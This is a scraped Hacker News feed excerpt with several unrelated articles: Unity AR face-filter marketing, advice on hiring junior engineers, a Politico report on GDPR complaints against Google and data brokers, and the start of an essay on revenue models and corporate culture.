<img src="https://www.banuba.com/hs-fs/hubfs/glasses,%20beard%20unity%203d%20mask.gif?width=600&amp;name=glasses,%20beard%20unity%203d%20mask.gif" alt="glasses, beard unity 3d mask" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/glasses%2C%20beard%20unity%203d%20mask.gif?width=300&amp;name=glasses%2C%20beard%20unity%203d%20mask.gif 300w, https://www.banuba.com/hs-fs/hubfs/glasses%2C%20beard%20unity%203d%20mask.gif?width=600&amp;name=glasses%2C%20beard%20unity%203d%20mask.gif 600w, https://www.banuba.com/hs-fs/hubfs/glasses%2C%20beard%20unity%203d%20mask.gif?width=900&amp;name=glasses%2C%20beard%20unity%203d%20mask.gif 900w, https://www.banuba.com/hs-fs/hubfs/glasses%2C%20beard%20unity%203d%20mask.gif?width=1200&amp;name=glasses%2C%20beard%20unity%203d%20mask.gif 1200w, https://www.banuba.com/hs-fs/hubfs/glasses%2C%20beard%20unity%203d%20mask.gif?width=1500&amp;name=glasses%2C%20beard%20unity%203d%20mask.gif 1500w, https://www.banuba.com/hs-fs/hubfs/glasses%2C%20beard%20unity%203d%20mask.gif?width=1800&amp;name=glasses%2C%20beard%20unity%203d%20mask.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>AR glasses are a must-have for poker games and a safe choice for live streaming, virtual rooms or any other social games. Players needn’t or don’t want to hide their face for privacy purposes but rather overlay AR accessory for fun. You can recreate realistic frames of popular brands for full functional e-commerce virtual try-on apps. Or go creative designing fabulous eyeglasses.</p>
<h3><span>2. Hats</span></h3>
<img src="https://www.banuba.com/hs-fs/hubfs/virtua%20hats%20unity%203d%20mask.gif?width=600&amp;name=virtua%20hats%20unity%203d%20mask.gif" alt="virtua hats unity 3d mask" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/virtua%20hats%20unity%203d%20mask.gif?width=300&amp;name=virtua%20hats%20unity%203d%20mask.gif 300w, https://www.banuba.com/hs-fs/hubfs/virtua%20hats%20unity%203d%20mask.gif?width=600&amp;name=virtua%20hats%20unity%203d%20mask.gif 600w, https://www.banuba.com/hs-fs/hubfs/virtua%20hats%20unity%203d%20mask.gif?width=900&amp;name=virtua%20hats%20unity%203d%20mask.gif 900w, https://www.banuba.com/hs-fs/hubfs/virtua%20hats%20unity%203d%20mask.gif?width=1200&amp;name=virtua%20hats%20unity%203d%20mask.gif 1200w, https://www.banuba.com/hs-fs/hubfs/virtua%20hats%20unity%203d%20mask.gif?width=1500&amp;name=virtua%20hats%20unity%203d%20mask.gif 1500w, https://www.banuba.com/hs-fs/hubfs/virtua%20hats%20unity%203d%20mask.gif?width=1800&amp;name=virtua%20hats%20unity%203d%20mask.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>Unity filters as virtual hats and caps can help to set the mood of your game or characters and they don’t require much design efforts. Create stylish hats or let users experience realistic virtual hats of popular brands in 3D.</p>
<h3><span>3. Animation</span></h3>
<img src="https://www.banuba.com/hs-fs/hubfs/unity%203d%20object%20animation%20filter.gif?width=600&amp;name=unity%203d%20object%20animation%20filter.gif" alt="unity 3d object animation filter" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/unity%203d%20object%20animation%20filter.gif?width=300&amp;name=unity%203d%20object%20animation%20filter.gif 300w, https://www.banuba.com/hs-fs/hubfs/unity%203d%20object%20animation%20filter.gif?width=600&amp;name=unity%203d%20object%20animation%20filter.gif 600w, https://www.banuba.com/hs-fs/hubfs/unity%203d%20object%20animation%20filter.gif?width=900&amp;name=unity%203d%20object%20animation%20filter.gif 900w, https://www.banuba.com/hs-fs/hubfs/unity%203d%20object%20animation%20filter.gif?width=1200&amp;name=unity%203d%20object%20animation%20filter.gif 1200w, https://www.banuba.com/hs-fs/hubfs/unity%203d%20object%20animation%20filter.gif?width=1500&amp;name=unity%203d%20object%20animation%20filter.gif 1500w, https://www.banuba.com/hs-fs/hubfs/unity%203d%20object%20animation%20filter.gif?width=1800&amp;name=unity%203d%20object%20animation%20filter.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>Add immersion and let players feel the vibe of your game with fancy 3D animation. You can animate 3D objects in Unity camera, make them move on a given trajectory, place it behind, in front of or right on the players' faces.&nbsp;</p>
<h3><span>4. Helmets</span></h3>
<img src="https://www.banuba.com/hs-fs/hubfs/helmets%20unity%20filter%20mask.gif?width=600&amp;name=helmets%20unity%20filter%20mask.gif" alt="helmets unity filter mask" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/helmets%20unity%20filter%20mask.gif?width=300&amp;name=helmets%20unity%20filter%20mask.gif 300w, https://www.banuba.com/hs-fs/hubfs/helmets%20unity%20filter%20mask.gif?width=600&amp;name=helmets%20unity%20filter%20mask.gif 600w, https://www.banuba.com/hs-fs/hubfs/helmets%20unity%20filter%20mask.gif?width=900&amp;name=helmets%20unity%20filter%20mask.gif 900w, https://www.banuba.com/hs-fs/hubfs/helmets%20unity%20filter%20mask.gif?width=1200&amp;name=helmets%20unity%20filter%20mask.gif 1200w, https://www.banuba.com/hs-fs/hubfs/helmets%20unity%20filter%20mask.gif?width=1500&amp;name=helmets%20unity%20filter%20mask.gif 1500w, https://www.banuba.com/hs-fs/hubfs/helmets%20unity%20filter%20mask.gif?width=1800&amp;name=helmets%20unity%20filter%20mask.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>Does your game take place in a mystery world, a certain historical period and involve interesting character outfits? Make sure to add them using thematic virtual helmets. Players can turn themselves into their favorite warrior, fighter, knight, viking or other character per your choice.&nbsp;</p>
<h3><span>5. Beauty effects</span></h3>
<img src="https://www.banuba.com/hs-fs/hubfs/mini%20mouse%20beauty%20filter%20unity.gif?width=600&amp;name=mini%20mouse%20beauty%20filter%20unity.gif" alt="mini mouse beauty filter unity" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/mini%20mouse%20beauty%20filter%20unity.gif?width=300&amp;name=mini%20mouse%20beauty%20filter%20unity.gif 300w, https://www.banuba.com/hs-fs/hubfs/mini%20mouse%20beauty%20filter%20unity.gif?width=600&amp;name=mini%20mouse%20beauty%20filter%20unity.gif 600w, https://www.banuba.com/hs-fs/hubfs/mini%20mouse%20beauty%20filter%20unity.gif?width=900&amp;name=mini%20mouse%20beauty%20filter%20unity.gif 900w, https://www.banuba.com/hs-fs/hubfs/mini%20mouse%20beauty%20filter%20unity.gif?width=1200&amp;name=mini%20mouse%20beauty%20filter%20unity.gif 1200w, https://www.banuba.com/hs-fs/hubfs/mini%20mouse%20beauty%20filter%20unity.gif?width=1500&amp;name=mini%20mouse%20beauty%20filter%20unity.gif 1500w, https://www.banuba.com/hs-fs/hubfs/mini%20mouse%20beauty%20filter%20unity.gif?width=1800&amp;name=mini%20mouse%20beauty%20filter%20unity.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>While men may prefer brutal filters, most women are sure not to miss beauty effects and fantasy makeup filters. Flower crowns, cute animation, fascinating accessories, fashion looks - let the beautiful part of your app audience upgrade their Unity camera experience and enjoy more creative ways of self presentation.&nbsp;</p>
<h3><span>6. Beards</span></h3>
<img src="https://www.banuba.com/hs-fs/hubfs/virtual%20beards%20Unity%20mask.gif?width=600&amp;name=virtual%20beards%20Unity%20mask.gif" alt="virtual beards Unity mask" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/virtual%20beards%20Unity%20mask.gif?width=300&amp;name=virtual%20beards%20Unity%20mask.gif 300w, https://www.banuba.com/hs-fs/hubfs/virtual%20beards%20Unity%20mask.gif?width=600&amp;name=virtual%20beards%20Unity%20mask.gif 600w, https://www.banuba.com/hs-fs/hubfs/virtual%20beards%20Unity%20mask.gif?width=900&amp;name=virtual%20beards%20Unity%20mask.gif 900w, https://www.banuba.com/hs-fs/hubfs/virtual%20beards%20Unity%20mask.gif?width=1200&amp;name=virtual%20beards%20Unity%20mask.gif 1200w, https://www.banuba.com/hs-fs/hubfs/virtual%20beards%20Unity%20mask.gif?width=1500&amp;name=virtual%20beards%20Unity%20mask.gif 1500w, https://www.banuba.com/hs-fs/hubfs/virtual%20beards%20Unity%20mask.gif?width=1800&amp;name=virtual%20beards%20Unity%20mask.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>Let users have fun overlaying virtual beards, realistic or fancy. Add entertainment filters to your AR mask collection or create a virtual facial hair try-on app in Unity with a variety of grooming ideas. Surprisingly, these hot-trending filters are favored by all people - the bearded, the beardless, men and women alike - and are sure to make our video chat game go viral.</p>
<h3><span>7. Seasonal</span></h3>
<img src="https://www.banuba.com/hs-fs/hubfs/beauty%20filter%20unity.gif?width=600&amp;name=beauty%20filter%20unity.gif" alt="beauty filter unity" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/beauty%20filter%20unity.gif?width=300&amp;name=beauty%20filter%20unity.gif 300w, https://www.banuba.com/hs-fs/hubfs/beauty%20filter%20unity.gif?width=600&amp;name=beauty%20filter%20unity.gif 600w, https://www.banuba.com/hs-fs/hubfs/beauty%20filter%20unity.gif?width=900&amp;name=beauty%20filter%20unity.gif 900w, https://www.banuba.com/hs-fs/hubfs/beauty%20filter%20unity.gif?width=1200&amp;name=beauty%20filter%20unity.gif 1200w, https://www.banuba.com/hs-fs/hubfs/beauty%20filter%20unity.gif?width=1500&amp;name=beauty%20filter%20unity.gif 1500w, https://www.banuba.com/hs-fs/hubfs/beauty%20filter%20unity.gif?width=1800&amp;name=beauty%20filter%20unity.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>In the same way, like game publishers roll out seasonal promo campaigns, you may promote your game with holiday face filters. They can bring a hint of diversity to your game and help you drive users organically, as more players are willing to share a game stream or selfie to celebrate a holiday.</p>
<h3><span>8. Game characters</span></h3>
<img src="https://www.banuba.com/hs-fs/hubfs/unitycorn%20ar%20filter%20unity.gif?width=600&amp;name=unitycorn%20ar%20filter%20unity.gif" alt="unitycorn ar filter unity" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/unitycorn%20ar%20filter%20unity.gif?width=300&amp;name=unitycorn%20ar%20filter%20unity.gif 300w, https://www.banuba.com/hs-fs/hubfs/unitycorn%20ar%20filter%20unity.gif?width=600&amp;name=unitycorn%20ar%20filter%20unity.gif 600w, https://www.banuba.com/hs-fs/hubfs/unitycorn%20ar%20filter%20unity.gif?width=900&amp;name=unitycorn%20ar%20filter%20unity.gif 900w, https://www.banuba.com/hs-fs/hubfs/unitycorn%20ar%20filter%20unity.gif?width=1200&amp;name=unitycorn%20ar%20filter%20unity.gif 1200w, https://www.banuba.com/hs-fs/hubfs/unitycorn%20ar%20filter%20unity.gif?width=1500&amp;name=unitycorn%20ar%20filter%20unity.gif 1500w, https://www.banuba.com/hs-fs/hubfs/unitycorn%20ar%20filter%20unity.gif?width=1800&amp;name=unitycorn%20ar%20filter%20unity.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>Nothing makes us more engaged into a game than game characters. Augmented reality filters can turn a player into their favorite characters who appeal to their traits. Or we may associate ourselves with characters based on their appearance. You can design high quality Unity 3D masks with rich graphics that transfer some of distinctive hero traits or replicate their in-game looks from head to toe.&nbsp;</p>
<h3><span>9. Face paint</span></h3>
<img src="https://www.banuba.com/hs-fs/hubfs/face%20mesh%20mask%20unity%20filter.gif?width=600&amp;name=face%20mesh%20mask%20unity%20filter.gif" alt="face mesh mask unity filter" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/face%20mesh%20mask%20unity%20filter.gif?width=300&amp;name=face%20mesh%20mask%20unity%20filter.gif 300w, https://www.banuba.com/hs-fs/hubfs/face%20mesh%20mask%20unity%20filter.gif?width=600&amp;name=face%20mesh%20mask%20unity%20filter.gif 600w, https://www.banuba.com/hs-fs/hubfs/face%20mesh%20mask%20unity%20filter.gif?width=900&amp;name=face%20mesh%20mask%20unity%20filter.gif 900w, https://www.banuba.com/hs-fs/hubfs/face%20mesh%20mask%20unity%20filter.gif?width=1200&amp;name=face%20mesh%20mask%20unity%20filter.gif 1200w, https://www.banuba.com/hs-fs/hubfs/face%20mesh%20mask%20unity%20filter.gif?width=1500&amp;name=face%20mesh%20mask%20unity%20filter.gif 1500w, https://www.banuba.com/hs-fs/hubfs/face%20mesh%20mask%20unity%20filter.gif?width=1800&amp;name=face%20mesh%20mask%20unity%20filter.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>Unity filters can cover a part of the face or overlay a full-face mesh mask allowing users to maintain privacy in the game video chat. A 3D mask precisely fits the face while still allowing players to show emotions and stay human without revealing their identity.&nbsp;&nbsp;&nbsp;</p>
<h3><span>10. Mixed looks</span></h3>
<img src="https://www.banuba.com/hs-fs/hubfs/mixed%20look%20unity%203d%20mask.gif?width=600&amp;name=mixed%20look%20unity%203d%20mask.gif" alt="mixed look unity 3d mask" width="600" srcset="https://www.banuba.com/hs-fs/hubfs/mixed%20look%20unity%203d%20mask.gif?width=300&amp;name=mixed%20look%20unity%203d%20mask.gif 300w, https://www.banuba.com/hs-fs/hubfs/mixed%20look%20unity%203d%20mask.gif?width=600&amp;name=mixed%20look%20unity%203d%20mask.gif 600w, https://www.banuba.com/hs-fs/hubfs/mixed%20look%20unity%203d%20mask.gif?width=900&amp;name=mixed%20look%20unity%203d%20mask.gif 900w, https://www.banuba.com/hs-fs/hubfs/mixed%20look%20unity%203d%20mask.gif?width=1200&amp;name=mixed%20look%20unity%203d%20mask.gif 1200w, https://www.banuba.com/hs-fs/hubfs/mixed%20look%20unity%203d%20mask.gif?width=1500&amp;name=mixed%20look%20unity%203d%20mask.gif 1500w, https://www.banuba.com/hs-fs/hubfs/mixed%20look%20unity%203d%20mask.gif?width=1800&amp;name=mixed%20look%20unity%203d%20mask.gif 1800w" sizes="(max-width: 600px) 100vw, 600px">
<p>Let your imagination go creative. Inspire users to discover new styles, looks and moods trying on AR filters in your Unity app. You can combine the designed assets, e.g. glasses, hats, beards and other into a single mask. Create new personalities or add celebrity masks in your app.&nbsp;</p>
<h2>What’s next?</h2>
<ul>
<li>Discover how our <a href="https://www.banuba.com/facear-sdk/unity-face-tracking" rel="noopener" target="_blank">Unity Face Tracking SDK</a> empowers developers to create cross-platform apps with face filters. Start your free trial of the Business version with 30 AR filters if you are a company.<!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-be619672-68cd-40b0-8808-abdc046ac320"><span id="hs-cta-be619672-68cd-40b0-8808-abdc046ac320"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/4992313/be619672-68cd-40b0-8808-abdc046ac320" target="_blank"><img id="hs-cta-img-be619672-68cd-40b0-8808-abdc046ac320" src="https://no-cache.hubspot.com/cta/default/4992313/be619672-68cd-40b0-8808-abdc046ac320.png" alt="Start Free Trial"></a></span></span><!-- end HubSpot Call-to-Action Code --></li>
<li>Explore <a href="https://www.banuba.com/faq/how-do-lite-and-business-versions-of-unity-face-tracking-plugin-differ" rel="noopener" target="_blank">how Lite and Business versions differ</a> to see what fits your best.&nbsp;</li>
<li>If you're an individual developer, visit the Asset Store to discover <a href="https://assetstore.unity.com/packages/add-ons/machinelearning/face-tracking-plugin-and-ar-face-masks-for-unity-153466#content" rel="noopener" target="_blank">Unity face tracking Lite plugin</a> with 6 AR filters.<br><!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-4241fca5-04fe-43f9-86dc-ace68673d0ef"><span id="hs-cta-4241fca5-04fe-43f9-86dc-ace68673d0ef"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/4992313/4241fca5-04fe-43f9-86dc-ace68673d0ef" target="_blank"><img id="hs-cta-img-4241fca5-04fe-43f9-86dc-ace68673d0ef" src="https://no-cache.hubspot.com/cta/default/4992313/4241fca5-04fe-43f9-86dc-ace68673d0ef.png" alt="Face AR Lite  Add Face Filters To Unity Go to Asset Store"></a></span></span><!-- end HubSpot Call-to-Action Code --></li>
<li>Create your AR masks and follow easy steps to integrate them into your app. Read: <a href="https://www.banuba.com/blog/how-to-create-face-masks-in-unity-face-ar-plugin">How To Add a 3D Mask Into Unity Face AR Plugin</a></li>
<li>Add filters to your Unity game, live streaming app or <a href="https://dev.to/icywind/how-to-add-chat-with-face-filters-to-your-multiplayer-unity-game-4mdk" rel="noopener" target="_blank">integrate AR masks with Agora</a> video chat to bring players face-to-face in real time.&nbsp;</li>
</ul></span>
            </p>

            
          </div></div>]]>
            </description>
            <link>https://www.banuba.com/blog/10-best-unity-3d-masks-to-increase-user-engagement-in-your-app</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543692</guid>
            <pubDate>Mon, 21 Sep 2020 14:12:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hiring junior engineers – when to hire them]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543616">thread link</a>) | @akdas
<br/>
September 21, 2020 | https://hiringfor.tech/2020/09/21/hiring-junior-engineers-part-1.html | <a href="https://web.archive.org/web/*/https://hiringfor.tech/2020/09/21/hiring-junior-engineers-part-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content"><figure id="cover-img">
  <p><img src="https://hiringfor.tech/assets/images/posts/2020-09-21-hiring-junior-engineers-part-1.jpg" alt="A man squatting with a barbell. Multiple people assist him in case the weight is too much."></p>
  <figcaption>
    <p>Individuals succeed when they have the support of their team. Photo by <a href="https://unsplash.com/@aloragriffiths?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Alora Griffiths</a> on <a href="https://unsplash.com/s/photos/mentor?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>
  </figcaption>
</figure>

<p>Over the course of this two-part series, I want to explore when and how you should hire junior engineers. At its core, the interview process needs to be based on the same guiding principle: look for strengths, not weaknesses. It’s just the strengths of a junior candidate are very different from those of a senior candidate.</p>

<p>In this first part, let’s explore when you would even want to hire junior candidates. What kind of team should you be trying to build?</p>

<h2 id="the-experience-potential-trade-off">The experience-potential trade-off</h2>

<p>A junior engineer doesn’t have much experience, but they typically have a vested interest in proving themselves. That results in a “get-it-done” attitude and out-of the box thinking. They are also more malleable to the company culture, so they are easier to integrate with an existing team, even as they bring in new ideas. It makes sense to bring in junior engineers to ensure the team is constantly evolving.</p>

<p>But, the flip side is the lack of experience leads to more mistakes and the inability to think long-term. A great senior engineer can craft an architecture that is easy to experiment with and sticks around for a long time. A junior engineer can solve the current problem, but each subsequent feature becomes harder to add.</p>

<h2 id="support-structures">Support structures</h2>

<p>If you’re at the earliest stages of building your company, you may be able to get away with hiring only junior engineers. After all, you need someone who can solve problems in any way possible, because you’re working on product-market fit. Later, when you have paying customers, you can hire a senior engineer to build a long-lasting architecture.</p>

<p>But even then, a senior engineer can put into place an architecture that’s easy to experiment on. Maybe that architecture doesn’t have extensive automated tests or the latest technologies, but those decisions were made deliberately to meet the needs of the company. So, if you’re building a team, consider the following steps:</p>

<ol>
  <li>
    <p>Generally prefer to start off your team with a few solid senior engineers. These engineers will build both an engineering culture and a technical foundation that can be iterated upon by others.</p>
  </li>
  <li>
    <p>Only then bring in junior engineers to evolve the team. With a strong foundation in place, the senior engineers can focus on mentoring the new hires, and the new hires can bring in their unique perspective.</p>
  </li>
</ol>

<p>There’s no exact ratio of senior to junior engineers that’s optimal, but try to have a healthy mix. Without the support structure provided by senior engineers, both types of engineers will feel frustrated.</p>

<h2 id="pay-discrepancies">Pay discrepancies</h2>

<p>Notice I haven’t talked about pay. Obviously, junior engineers cost less in compensation, but that’s because you’re paying for different skill sets. If you need someone to build an engineering culture, a lower-paid junior engineer can’t do the job. If you’re looking for someone to pump out code, an architect is not the right fit.</p>

<p>So don’t consider these different roles as interchangeable. You won’t save money this way.</p>

<hr>

<p>Hiring junior engineers is a great idea, <em>provided you have the right support structure to help them succeed</em>. Typically, this means hiring some solid senior engineers to lay the foundation, then later provide mentorship to new hires. Thinking this way allows you to hire the right individuals at the right time.</p>
</section></div>]]>
            </description>
            <link>https://hiringfor.tech/2020/09/21/hiring-junior-engineers-part-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543616</guid>
            <pubDate>Mon, 21 Sep 2020 14:06:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google and data brokers accused of illegally collecting people’s data: report]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543614">thread link</a>) | @chris_f
<br/>
September 21, 2020 | https://www.politico.eu/article/google-and-data-brokers-accused-of-illegally-collecting-data-report/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/google-and-data-brokers-accused-of-illegally-collecting-data-report/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
							<div>
            <figure><div><div><p><img src="https://g8fip1kplyr33r3krz5b97d1-wpengine.netdna-ssl.com/wp-content/uploads/2020/09/GettyImages-1200825328-714x476.jpg"></p></div></div><figcaption><p>Google faces allegations of illegal user-data collection | Kenzo Tribouillard/AFP via Getty Images</p></figcaption></figure>        <div>
        <header>
                        
                        <p>A campaigner says much of the world’s online advertising industry doesn’t comply with Europe’s privacy rules.</p>
                    </header>
                
<!--/.meta-->
    </div><!--/.summary-->
</div><!--/.story-intro-->

							
							
							<p>Google and several data brokers are violating the EU's privacy rules by harvesting people's personal information to build highly detailed online profiles, including some firms' collection of information on sexual orientation, health status and religious beliefs, <a href="https://g8fip1kplyr33r3krz5b97d1-wpengine.netdna-ssl.com/wp-content/uploads/2020/09/JohnnyRyanDocumnet.pdf">according to a report</a> published on Monday.</p>
<p>The accusations — from Johnny Ryan, a senior fellow at the Irish Council for Civil Liberties, an NGO — come 18 months after Ireland's privacy regulator began a probe into how Google collects and shares people's online information for its advertising business.</p>
<p>Several other European data protection authorities subsequently received separate complaints into so-called real-time bidding (RTB), a system by which advertisers use data to target people with paid-for messages when they surf the web.</p>
<p>The online advertising industry, including Google, says it has bolstered privacy protections since the European Union started enforcing its updated rules, known as the General Data Protection Regulation, or GDPR, more than two years ago.</p>
<p>But Ryan, who filed a complaint with the Irish privacy regulator about these data practices in September 2018, said that little has changed since the new rules came online two years ago.</p>
<p>He called on Ireland's Data Protection Commission (DPC) to act swiftly to clamp down on what he believes were wide-scale breaches of people's online privacy, including the use of online profiles to target individuals around sensitive topics like whether they have AIDS, and to influence voters during elections.</p>
<p>Ryan said the real-time bidding system, which broadcasted web users' online behavior and habits to multiple advertising companies and data brokers, infringed on the region's privacy rules that required data to be kept secure and used proportionately.</p>
<p>"The [Irish Data Protection] Commission has failed to stop that ongoing biggest data breach in history and as a consequence people across Europe and in Ireland are exposed to intimate profiling including of health conditions and political views and location over time, because the RTB system leaks that data into the data broker market," he told POLITICO in reference to Ireland's privacy regulator.</p>
<h3>Spotlight on Dublin</h3>
<p>Because Dublin is home to many of the world's largest tech companies like Google and Facebook, it has the responsibility to oversee how they comply with Europe's privacy standards.</p>
<p>Under the region's data protection rules, sensitive data, including information about a person's health status, sexual orientation or religious beliefs, must be handled more carefully than other information, and companies have to explicitly ask individuals if such information can be collected about them.</p>
<p>"The question for Ireland and the Irish government that must be answered is whether DPC is capable of advancing critical urgent investigations of this nature," he added. "Does it have adequate resources, including technical and procedural competence to discharge its tasks?"</p>
<p>In response, Ireland's privacy agency said that it had met with Ryan to discuss his concerns and that work on its Google investigation continues. The watchdog also has a separate ongoing probe into the data practices of Quantcast, a major online advertising firm, though it has yet to bring an enforcement action or fine against any non-Irish company or organization under Europe's privacy rules.</p>
<p>"The investigation has progressed and a full update on the next steps [was] provided to the concerned party," said Graham Doyle, deputy commissioner at Ireland's privacy agency, in reference to Ryan's complaint about how Google and others collect and use people's data. He declined to comment on what the next steps would be or when a decision would be taken in the investigation into the search giant.</p>
<p>Google said that it also has safeguards in place to protect people's personal data, including in its real-time bidding network.</p>
<p>"We do not allow advertisers to select ads based on sensitive personal data and we do not share people’s sensitive personal data, browsing histories or profiles with advertisers," Alex McPhillips, a Google spokesman, said in a statement.</p>
<p>In his report, Ryan outlines what he says are ongoing privacy failures by many of the world's largest online advertising firms and data brokers linked to the global real-time bidding industry.</p>
<p>That includes OnAudience, a data broker, that holds data on people in almost every country on the planet, according to its website.</p>
<p>It used that information,&nbsp;for instance, to target 1.4 million people who supported gay rights during last year's Polish parliamentary election, <a href="https://www.dropbox.com/sh/7xo77grl2mnb6b6/AAAlszXoQ_zM2kUSsSRqKJSqa?dl=0&amp;preview=4.+Evidence+of+election+interference+in+Poland+(Appendix+A).pdf" target="_blank">based on&nbsp;a company presentation</a>. To do that, OnAudience created online profiles of people based on whether they had read, watched or searched for content associated with LGBTQ rights ahead of the vote, and used that data for a get-out-the-vote campaign for a local group.</p>
<p>The company also uses its database to allow clients to target people who have displayed an interest in other sensitive data topics such as AIDS and HIV, diabetes, incest and abuse support. Such information is considered sensitive and must be handled with additional care under Europe's privacy rules.</p>
<p>An OnAudience representative said the company does not process any personal data, or information about sexual orientation. “Our data is only based on online behavior and visited content. The campaign mentioned [in Ryan’s research] was not conducted by a political party, but by a social organization that promotes equality.”</p>
<p>"The most intimate thing about anyone that you can buy is their health data because this dictates their life expectancy, their ability to pay their mortgage, the risk of giving them health insurance and potentially influences decisions about whether to employ them," Ryan said.</p>
<p><em>Want more analysis from </em><span>POLITICO</span><em>? </em><span>POLITICO</span><em> Pro is our premium intelligence service for professionals. From financial services to trade, technology, cybersecurity and more, Pro delivers real time intelligence, deep insight and breaking scoops you need to keep one step ahead. Email <a href="mailto:pro@politico.eu" target="_blank">pro@politico.eu</a> to request a complimentary trial.</em></p>

														<!--/.story-supplement-->
							
							
							<!--/.story-supplement-->

						</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/google-and-data-brokers-accused-of-illegally-collecting-data-report/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543614</guid>
            <pubDate>Mon, 21 Sep 2020 14:06:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Anti-Shoplifting Devices Work]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543610">thread link</a>) | @julkali
<br/>
September 21, 2020 | https://www.trizgyrus.com/trizgyrus/wp-content/howstuf/howstuff/Howstuffworks%20How%20Anti-shoplifting%20Devices%20Work.htm | <a href="https://web.archive.org/web/*/https://www.trizgyrus.com/trizgyrus/wp-content/howstuf/howstuff/Howstuffworks%20How%20Anti-shoplifting%20Devices%20Work.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.trizgyrus.com/trizgyrus/wp-content/howstuf/howstuff/Howstuffworks%20How%20Anti-shoplifting%20Devices%20Work.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543610</guid>
            <pubDate>Mon, 21 Sep 2020 14:06:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is revenue model more important than culture?]]>
            </title>
            <description>
<![CDATA[
Score 219 | Comments 111 (<a href="https://news.ycombinator.com/item?id=24543510">thread link</a>) | @Ozzie_osman
<br/>
September 21, 2020 | https://somehowmanage.com/2020/09/20/revenue-model-not-culture-is-the-dominant-term/ | <a href="https://web.archive.org/web/*/https://somehowmanage.com/2020/09/20/revenue-model-not-culture-is-the-dominant-term/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-101">

	

	
	<div>
		
<p>I always loved getting problems of the type “What is the limit as x approaches infinity” type in high-school/college. You’re given an equation (of the classic y=x format), and asked to derive what the value of y will be as x grows to infinity.</p>



<p>One thing you learn pretty quickly about these types of problems is that often it doesn’t matter where the function “starts” (or where it is at small values of x). It could start at zero, or at negative infinity, but its limit might be infinity, and vice versa (it could start large but have a limit of zero or negative infinity).</p>



<p>In fact, for many equations, there’s usually one <strong>dominant term</strong>. This is the term that dominates the limit. There might be countless other factors or parts of the equation that matter initially, but eventually it’s that dominant term that wins. This is sometimes known as the <strong>dominant term rule</strong>. We’ll get back to this in a second.</p>



<h3>Ads vs. Search</h3>



<p>Google had a little press kerfuffle a few months ago. You can read a summary in the New York Times <a href="https://www.nytimes.com/2020/01/31/technology/google-search-results.html">here</a>, but the short of it is that the company launched a design change that made search results and ads look very similar. Presumably, this increased revenue for Google, since many people ignore ads when they can easily identify them, the same way you’d ignore stepping in dog crap if you can identify it in the mud (and yes, given the state of online ads and content I pick this analogy deliberately). But there was a pretty strong backlash against this as a “dark pattern” designed to trick users. After the negative press, Google walked back the change.</p>



<p>If you’ve been following the news around big tech companies these past couple of years, this type of behavior is not surprising at all. These companies have grown really large, are arguably monopolistic, and hyper-focused on growth and revenue. Over and over, they have made decisions that have resulted in backlash from the press and from their users.</p>



<p>On the other hand, if I ignore the past ten years, and jump back to when I worked at Google as an entry-level Software Engineer, it is a <em>little</em> surprising to me. I worked at Google from 2006-2009. At the time, it was already a rapidly-growing public company (I think I joined when there were around 8,000 employees, and left when there were 20,000). I initially worked on the team responsible for AdWords, so I had some exposure to the culture and decisions that were made at the time (of course it wasn’t <em>deep</em> exposure, since I was an entry-level Software Engineer on the lowest rung of the ladder… but it was exposure nonetheless).</p>



<p><em>Note: I’m going to pick on Google a little bit here, but I do love that company. I think there’s a lot it can improve on, but it’s still one of my favorite and least “evil” large tech company. I chose them simply because I’m more familiar with them.</em></p>



<p>At the time, Google employees might have argued against making a change because it was “evil”. The “don’t be evil” motto was still around, and as engineers who were building parts of the product and making decisions, we were pretty ideological about it. One of the company’s values was also to put users first, employees second, and shareholders third. By any of these lenses, the type of design change that Google got flak for recently would have been highly unlikely at the time.</p>



<h3>Revenue is the Dominant Term</h3>



